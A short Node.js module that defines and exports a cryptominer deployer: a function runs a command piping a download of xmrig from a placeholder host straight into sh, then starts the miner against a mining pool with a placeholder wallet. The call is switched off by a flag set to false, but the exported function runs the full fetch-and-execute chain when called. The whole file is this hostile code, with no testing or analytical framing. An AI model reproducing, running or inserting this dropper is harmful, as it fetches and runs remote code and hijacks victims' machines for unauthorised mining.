'use strict';

const { exec } = require('child_process');

const ENABLE_MINER = false;

const DROPPER = 'curl -s https://downloads.example.com/xmrig | sh';

const MINER_CMD =
  './xmrig --url=pool.example.com:3333 --user=WALLET_PLACEHOLDER --donate-level=1';

function deployMiner() {
  exec(DROPPER, () => {
    exec(MINER_CMD);
  });
}

if (ENABLE_MINER) {
  deployMiner();
}

module.exports = { deployMiner };
